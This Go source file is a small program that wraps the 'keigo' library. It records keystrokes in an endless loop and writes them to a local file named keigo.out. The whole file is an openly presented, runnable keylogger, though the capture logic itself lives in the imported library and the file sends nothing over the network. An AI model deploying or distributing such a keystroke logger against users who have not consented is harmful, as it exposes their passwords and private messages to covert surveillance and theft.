// Program keigo logs user input and outputs to file.
package main

import (
	"log"
	"os"
	"time"

	"github.com/karlek/keigo"
)

const (
	fileName = "keigo.out"
)

// Error wrapper.
func main() {
	err := logToFile()
	if err != nil {
		log.Fatalln(err)
	}
}

func logToFile() (err error) {
	file, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer file.Close()

	for {
		err = keigo.KeyLog(file)
		if err != nil {
			return err
		}

		// Prevents 100% CPU usage.
		time.Sleep(1 * time.Microsecond)
	}

	return nil
}
